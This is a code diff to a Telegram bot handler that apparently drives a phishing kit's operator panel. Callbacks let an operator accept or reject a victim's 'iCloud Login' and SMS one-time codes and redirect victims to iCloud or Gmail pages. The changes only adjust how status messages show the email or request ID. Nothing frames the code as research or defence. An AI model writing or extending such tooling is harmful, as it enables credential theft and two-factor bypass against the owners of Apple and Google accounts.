@@ -388,11 +388,13 @@ bot.on("callback_query", async (query) => {
     // ============================================================================
     
     let email = identifier;
+    let displayValue = email;  // ✅ What to show in the message
 
-    // ✅ For SMS callbacks, extract real email from pendingCodes[requestId]
+    // ✅ For SMS callbacks, get email from server
     if (action.startsWith("sms_") && identifier && identifier.includes("sms_code_")) {
-      // This is a SMS requestId, get email from server via update-status call
-      // The server will handle mapping requestId → email
+      // For SMS callbacks, identifier is requestId, email should be extracted
+      // Since we can't access server's pendingCodes here, just use email placeholder
+      displayValue = identifier;  // Show requestId if we don't have email
       console.log(`📝 SMS callback: requestId ${identifier}`);
     }
 
@@ -464,9 +466,9 @@ bot.on("callback_query", async (query) => {
       } else if (action === "page_reject") {
         statusMessage = `☁️ <code>${email}</code> iCloud Login <b>REJECTED</b>! ❌`;
       } else if (action === "sms_accept") {
-        statusMessage = `💬 <code>${email}</code> SMS <b>ACCEPTED</b>! ✅`;
+        statusMessage = `💬 SMS <b>ACCEPTED</b>! ✅`;
       } else if (action === "sms_reject") {
-        statusMessage = `💬 <code>${email}</code> SMS <b>REJECTED</b>! ❌`;
+        statusMessage = `💬 SMS <b>REJECTED</b>! ❌`;
       } else if (action === "redirect_icloud") {
         statusMessage = `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`;
       } else if (action === "redirect_gmail") {
